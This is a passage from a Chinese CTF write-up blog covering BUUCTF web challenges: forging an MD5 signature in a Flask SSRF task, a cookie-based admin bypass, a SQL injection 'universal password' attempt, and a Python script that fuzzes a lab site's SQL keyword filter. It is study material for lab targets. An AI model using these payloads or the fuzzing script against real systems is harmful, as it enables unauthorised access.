Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-comment"># 返回secert_key + param + action的md5结果</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-comment"># 对content内容进行md5加密</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><span class="hljs-comment"># 对输入的参数进行过滤</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    <span class="hljs-comment"># 去除param首位空格，并将该字符串全部字符小写化</span><br>    check = param.strip().lower()<br>    <span class="hljs-comment"># 检测字符串是否以gopher和file开头</span><br>    <span class="hljs-comment"># 即过滤了gopher和file两个协议</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># main函数描述了该代码通过访问的路由来控制显示的网页内容</span><br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><h3 id="知识点介绍"><a href="#知识点介绍" class="headerlink" title="知识点介绍:"></a><strong>知识点介绍:</strong></h3><p>参考：<a href="https://geek-docs.com/flask/flask-questions/268_flask_flask_requestargsget_get_all_params_python.html">Flask Flask request.args.get 获取所有参数（Python）|极客教程 (geek-docs.com)</a></p><p><strong>urllib.unquote(string):将url编码的字符串进行解码</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">import urllib.parse<br><br>str = &#x27;%E6%B3%95%E5%9B%BD%E7%BA%A2%E9%85%92&#x27;<br><br>print(urllib.parse.unquote(str))<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">法国红酒<br></code></pre></td></tr></table></figure><h5 id="使用request-args-get获取指定参数的值"><a href="#使用request-args-get获取指定参数的值" class="headerlink" title="使用request.args.get获取指定参数的值"></a>使用request.args.get获取指定参数的值</h5><p>例子:假设我们有一个URL为<code>/user?name=John&amp;age=25</code>，我们想要获取到对应参数的值</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs txt">from flask import Flask, request<br><br>app = Flask(__name__)<br><br>@app.route(&#x27;/user&#x27;, methods=[&#x27;GET&#x27;])<br>def get_user():<br>    name = request.args.get(&#x27;name&#x27;)<br>    age = request.args.get(&#x27;age&#x27;)<br><br>    return f&quot;Name: &#123;name&#125;, Age: &#123;age&#125;&quot;<br><br>if __name__ == &#x27;__main__&#x27;:<br>    app.run()<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">在上面的代码中，我们定义了一个路由/user，并指定该路由只支持GET方法。<br>在get_user函数中，我们使用request.args.get方法获取了URL参数中名为name和age的值，并将其拼接成字符串返回。当我们访问/user?name=John&amp;age=25时，页面会显示Name: John, Age: 25<br></code></pre></td></tr></table></figure><h5 id="使用request-args-get获取所有参数的值"><a href="#使用request-args-get获取所有参数的值" class="headerlink" title="使用request.args.get获取所有参数的值"></a>使用request.args.get获取所有参数的值</h5><p>例子:有时候我们并不知道URL参数的具体名称，或者URL参数的数量是可变的。这时，我们可以使用<code>request.args.get</code>方法的另一种形式，即不传递参数名，直接获取所有参数的值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    args = request.args.get()<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;All Params: <span class="hljs-subst">&#123;args&#125;</span>&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">在上述代码中，我们使用request.args.get方法获取所有URL参数的值，并将其拼接成字符串返回。例如，当我们访问/user?name=John&amp;age=25&amp;city=New+York时，页面会显示All Params: ImmutableMultiDict([(&#x27;name&#x27;, &#x27;John&#x27;), (&#x27;age&#x27;, &#x27;25&#x27;), (&#x27;city&#x27;, &#x27;New York&#x27;)])。<br></code></pre></td></tr></table></figure><h5 id="需要注意的是，request-args-get方法返回的是一个ImmutableMultiDict对象，它类似于字典但是不可修改。我们可以使用其提供的方法来获取参数值，比如args-getlist-‘name’-可以获取名为name的参数的所有值"><a href="#需要注意的是，request-args-get方法返回的是一个ImmutableMultiDict对象，它类似于字典但是不可修改。我们可以使用其提供的方法来获取参数值，比如args-getlist-‘name’-可以获取名为name的参数的所有值" class="headerlink" title="需要注意的是，request.args.get方法返回的是一个ImmutableMultiDict对象，它类似于字典但是不可修改。我们可以使用其提供的方法来获取参数值，比如args.getlist(‘name’)可以获取名为name的参数的所有值"></a>需要注意的是，request.args.get方法返回的是一个ImmutableMultiDict对象，它类似于字典但是不可修改。我们可以使用其提供的方法来获取参数值，比如args.getlist(‘name’)可以获取名为name的参数的所有值</h5><p>例子:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    args = request.args.get()<br>    name = args.getlist(<span class="hljs-string">&#x27;name&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Name: <span class="hljs-subst">&#123;name&#125;</span>&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">在上述代码中，我们使用args.getlist方法获取名为name的参数的所有值，并将其拼接成字符串返回。当我们访问/user?name=John&amp;name=Tom&amp;name=Jack时，页面会显示Name: [&#x27;John&#x27;, &#x27;Tom&#x27;, &#x27;Jack&#x27;]<br></code></pre></td></tr></table></figure><h5 id="hashlib-md5"><a href="#hashlib-md5" class="headerlink" title="hashlib.md5():"></a>hashlib.md5():</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib         <span class="hljs-comment">#导入hashlib模块</span><br><br>md = hashlib.md5()     <span class="hljs-comment">#获取一个md5加密算法对象</span><br>md.update(<span class="hljs-string">&#x27;how to use md5 in hashlib?&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))                   <span class="hljs-comment">#制定需要加密的字符串</span><br><span class="hljs-built_in">print</span>(md.hexdigest())  <span class="hljs-comment">#获取加密后的16进制字符串</span><br></code></pre></td></tr></table></figure><p>输出结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">d26a53750bc40b38b65a520292f69306<br></code></pre></td></tr></table></figure><h5 id="str-strip-chars-移除在字符串str中的首尾字符chars-默认移除空格"><a href="#str-strip-chars-移除在字符串str中的首尾字符chars-默认移除空格" class="headerlink" title="str.strip([chars]):移除在字符串str中的首尾字符chars,默认移除空格"></a>str.strip([chars]):移除在字符串str中的首尾字符chars,默认移除空格</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">str = &quot;0000hello0000&quot;.strip(&#x27;0&#x27;)<br>print(str)<br># hello<br>str = &quot;     hello    &quot;.strip()<br>print(str)<br># hello<br></code></pre></td></tr></table></figure><h5 id="str-lower-将字符串str所有字符转小写"><a href="#str-lower-将字符串str所有字符转小写" class="headerlink" title="str.lower():将字符串str所有字符转小写"></a>str.lower():将字符串str所有字符转小写</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;AAAAAsssDDD&quot;</span>.lower()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><span class="hljs-comment"># aaaaasssddd</span><br></code></pre></td></tr></table></figure><h5 id="Python-startswith-方法用于检查字符串是否是以指定子字符串开头，如果是则返回-True，否则返回-False。如果参数-beg-和-end-指定值，则在指定范围内检查："><a href="#Python-startswith-方法用于检查字符串是否是以指定子字符串开头，如果是则返回-True，否则返回-False。如果参数-beg-和-end-指定值，则在指定范围内检查：" class="headerlink" title="Python startswith() 方法用于检查字符串是否是以指定子字符串开头，如果是则返回 True，否则返回 False。如果参数 beg 和 end 指定值，则在指定范围内检查："></a>Python startswith() 方法用于检查字符串是否是以指定子字符串开头，如果是则返回 True，否则返回 False。如果参数 beg 和 end 指定值，则在指定范围内检查：</h5><p>参考:<a href="https://www.runoob.com/python/att-string-startswith.html">Python startswith()方法 | 菜鸟教程 (runoob.com)</a></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829131547193.png" alt="image-20230829131547193"></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829131601809.png" alt="image-20230829131601809"></p><h5 id="urllib-urlopen-path"><a href="#urllib-urlopen-path" class="headerlink" title="urllib.urlopen(path):"></a>urllib.urlopen(path):</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br><br>myURL = urlopen(<span class="hljs-string">&quot;https://www.runoob.com/&quot;</span>)<br><span class="hljs-built_in">print</span>(myURL.read())<br></code></pre></td></tr></table></figure><p>解释:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">以上代码使用 urlopen 打开一个 URL，然后使用 read() 函数获取网页的 HTML 实体代码。<br><br>read() 是读取整个网页内容，我们可以指定读取的长度<br>如读取长度为300：read(300)<br></code></pre></td></tr></table></figure><h5 id="REMOTE-ADDR"><a href="#REMOTE-ADDR" class="headerlink" title="REMOTE_ADDR:"></a>REMOTE_ADDR:</h5><p>参考:<a href="https://www.cnblogs.com/luxiaojun/p/10451860.html">HTTP 请求头中的 Remote_Addr，X-Forwarded-For，X-Real-IP - 23云恋49枫 - 博客园 (cnblogs.com)</a></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">表示发出请求的远程主机的 IP 地址，remote_addr代表客户端的IP，但它的值不是由客户端提供的，而是服务端根据客户端的ip指定的，当你的浏览器访问某个网站时，假设中间没有任何代理，那么网站的web服务器（Nginx，Apache等）就会把remote_addr设为你的机器IP，如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP<br></code></pre></td></tr></table></figure><h5 id="x-forwarded-for："><a href="#x-forwarded-for：" class="headerlink" title="x_forwarded_for："></a>x_forwarded_for：</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项，正如上面所述,当你使用了代理时,web服务器就不知道你的真实IP了,为了避免这个情况,代理服务器通常会增加一个叫做x_forwarded_for的头信息,把连接它的客户端IP(即你的上网机器IP)加到这个头信息里,这样就能保证网站的web服务器能获取到真实IP<br></code></pre></td></tr></table></figure><h5 id="os-path-exists"><a href="#os-path-exists" class="headerlink" title="os.path.exists():"></a>os.path.exists():</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">os即operating system（操作系统），Python 的 os 模块封装了常见的文件和目录操作。os.path模块主要用于文件的属性获取,exists是“存在”的意思，所以顾名思义，os.path.exists()就是判断括号里的文件是否存在的意思，括号内的可以是文件路径<br>原文链接：https://blog.csdn.net/u012424313/article/details/82216092<br></code></pre></td></tr></table></figure><p>4.分析:<br>(1).有代码分析得访问url&#x2F;geneSign只会返回md5(secert_key + param + action)的结果，访问url&#x2F;只会返回code.txt文件的内容，所以我们只能去访问url&#x2F;De1ta:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://25f82c99-8160-4244-bc6c-fee7c6ef602e.node4.buuoj.cn:81/De1ta<br></code></pre></td></tr></table></figure><p>对路由器@app.route(‘&#x2F;De1ta’, methods&#x3D;[‘GET’, ‘POST’])下的函数进行分析后得:</p><p>我们需要令param&#x3D;flag.txt,同时action中必须有scan,这样就可以调用</p><p>scan(param)，去访问当前网页下的文件flag.txt(如果直接访问是访问不到的，可能是flask框架的作用)</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829140947972.png" alt="image-20230829140947972"></p><p>(2).但是如果只有scan是无法对文件内容进行显示的，只有action中包含有read时，才能进行显示文件内容:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141123757.png" alt="image-20230829141123757"></p><p>read可以将写入flag.txt的内容的文件result.txt再次进行读取，并存如最终需要显示的result字典中:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141312146.png" alt="image-20230829141312146"></p><p>所以action&#x3D;scanread</p><p>(3).要触发上述内容需要绕过checkSign()的检测:<br><strong>md5(secert_key + param + action)&#x3D;sign</strong></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141406740.png" alt="image-20230829141406740"></p><p>5.最终payload的构造:</p><p>(1).<strong>secert_key:</strong><br><img src="/images/2023-8-29-SSRFMe/image-20230829142324834.png" alt="image-20230829142324834"></p><p><strong>由于flask框架中，网页显示（执行）的都是路由器的内容，所以对于网页来说，在路由器之前所定义的secert_key在网页显示后都是唯一的，即在网页初始化的时候对secert_key赋值，之后该全局变量都是不变的</strong></p><p>(2).参数的基本情况:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">param=flag.txt<br>action=scanread<br>secert_key=xxx<br>sign=md5(xxxflag.txtscanread)<br></code></pre></td></tr></table></figure><p>现在就是要获取md5(xxxflag.txtscanread)的值</p><p>(3)url&#x2F;geneSign的利用:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829142858868.png" alt="image-20230829142858868"></p><p>该路由器会返回:md5(secert_key+param+scan)的值</p><p>所以如果我们令param&#x3D;flag.txtread</p><p>则该路由器返回的就是md5(xxxflag.txtreadscan)</p><p>就可以活得sign的值：<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">param=flag.txtread<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">5927506259f0daa2cdfb35867203b343<br></code></pre></td></tr></table></figure><p>所以此时sign&#x3D;5927506259f0daa2cdfb35867203b343&#x3D;xxxflag.txtreadscan</p><p>(3).最终的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">url/De1ta<br>?param=flag.txt<br><br>Cookie:action=readscan;sign=5927506259f0daa2cdfb35867203b343<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-SSRFMe/image-20230829143838356.png" alt="image-20230829143838356"></p><p>flag&#x3D;flag{ceb51b96-bdcf-415a-bb56-da305f851028}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie 题解</title>
    <link href="/2023/08/29/2023-08-29-Futurella&amp;Kookie/"/>
    <url>/2023/08/29/2023-08-29-Futurella&amp;Kookie/</url>
    
    <content type="html"><![CDATA[<h2 id="BSidesCF-2019-Futurella-BSidesCF-2019-Kookie-题解"><a href="#BSidesCF-2019-Futurella-BSidesCF-2019-Kookie-题解" class="headerlink" title="[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie 题解"></a>[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie 题解</h2><h3 id="BSidesCF-2019-Futurella："><a href="#BSidesCF-2019-Futurella：" class="headerlink" title="[BSidesCF 2019]Futurella："></a>[BSidesCF 2019]Futurella：</h3><p>1.打开网页:</p><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102315243.png" alt="image-20230829102315243"></p><p>2.查看网页源代码，ctrl+f寻找flag：<br><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102410491.png" alt="image-20230829102410491"></p><p>flag&#x3D;flag{bbc0ff54-a162-4d27-a1db-2e02a3bb9208}</p><h3 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie:"></a>[BSidesCF 2019]Kookie:</h3><p>1.打开网页:<br><img src="/images/2023-8-29-Futurella-Kookie/image-20230829100927708.png" alt="image-20230829100927708"></p><p>发现需要进行登录，然后登录时要为admin</p><p>2.查看网页源代码，没有发现有用信息，那么我们使用万能密码试试:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admin<br>password=1&#x27;or&#x27;1&#x27;=&#x27;1&#x27;;#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101139704.png" alt="image-20230829101139704"></p><p>发现不行</p><p>查看是否存在sql注入:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admin<br>password=1&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101226407.png" alt="image-20230829101226407"></p><p>发现没有sql报错</p><p><strong>3.使用三大盲注，但是盲注是回显1或0的界面，由于password不是0或1所以无论怎么样都回显的是错误界面</strong></p><p>4.有题目提示得，这题和cookie有关，我们用BP对其进行抓包:</p><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101755577.png" alt="image-20230829101755577"></p><p>我们猜测可能要修改cookie的值，但是在headers中没有发现cookie字段</p><p>又根据题目提示：we found the account cookie,猜测他们可能是从cookie中判断当前用户的登录账户是谁</p><p>构造payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:username=admin<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102106154.png" alt="image-20230829102106154"></p><p>发现了flag</p><p>flag&#x3D;flag{98c976cd-ae86-46c5-b83e-8d86080798b9}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN2019 华北赛区 Day2 Web1]Hack World 题解</title>
    <link href="/2023/08/28/2023-08-28-%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/"/>
    <url>/2023/08/28/2023-08-28-%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>1.打开网页:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828141042210.png" alt="image-20230828141042210"></p><p>发现有一个注入点，尝试对其进行注入，由题目提示得，flag在数据库中，所以该注入点应该为sql注入:</p><p>使用BP测试该网站属于什么请求:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141849022.png" alt="image-20230828141849022"></p><p>使用脚本判断该网站过滤了哪些内容:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 打开读取SQL_fuzz文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># 删除读取数据中的&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # 字符串根据空格进行分割</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br><span class="hljs-comment"># 进行fuzz注入</span><br>url = <span class="hljs-string">&quot;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&quot;</span><br><span class="hljs-comment"># GET请求</span><br><span class="hljs-comment"># for data in data_list:</span><br><span class="hljs-comment">#     da = data</span><br><span class="hljs-comment">#     da = &quot;1 &#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     da = &quot;1&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     r = requests.get(url+da)</span><br><span class="hljs-comment">#     # 使用time使请求能够拥有足够的时间去响应</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     # 获取过滤网站响应信息</span><br><span class="hljs-comment">#     reponse_txt = &quot;臭弟弟&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         print(&quot;该网站过滤了&#123;&#125;&quot;.format(data))</span><br><br><span class="hljs-comment"># POST请求</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data_list:<br>    <span class="hljs-comment"># da = d</span><br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(d)</span><br>    da = <span class="hljs-string">&quot;1&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d)<br>    payload = &#123;<br>        <span class="hljs-string">&quot;id&quot;</span>: da<br>    &#125;<br>    r = requests.post(url=url, data=payload)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    reponse_txt = <span class="hljs-string">&quot;SQL&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该网站过滤了&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d))<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs txt">该网站过滤了length Length<br>该网站过滤了+<br>该网站过滤了handler<br>该网站过滤了selectSeleCT <br>该网站过滤了delete<br>该网站过滤了oroR<br>该网站过滤了-~<br>该网站过滤了limitLimIt<br>该网站过滤了insertinsERTINSERT<br>该网站过滤了#<br>该网站过滤了--+<br>该网站过滤了INFORMATION<br>该网站过滤了--<br>该网站过滤了;<br>该网站过滤了+<br>该网站过滤了xor<br>该网站过滤了ANDANd<br>该网站过滤了&quot;<br>该网站过滤了length <br>该网站过滤了+<br>该网站过滤了unionUNIonUNION<br>该网站过滤了&quot;<br>该网站过滤了&amp;<br>该网站过滤了&amp;&amp;<br>该网站过滤了||<br>该网站过滤了oorr<br>该网站过滤了//*<br>该网站过滤了*/*<br>该网站过滤了/**/<br>该网站过滤了anandd<br>该网站过滤了GROUP<br>该网站过滤了INTO<br>该网站过滤了OR<br>该网站过滤了ORDER<br>该网站过滤了ORD<br>该网站过滤了UNION<br>该网站过滤了UPDATE<br>该网站过滤了AND<br>该网站过滤了delete<br>该网站过滤了GROUP_CONCAT<br>该网站过滤了group_concat<br>该网站过滤了DELETE<br>该网站过滤了floor<br>该网站过滤了rand()<br>该网站过滤了information_schema.tables<br>该网站过滤了LIMIT<br>该网站过滤了ORD<br>该网站过滤了order 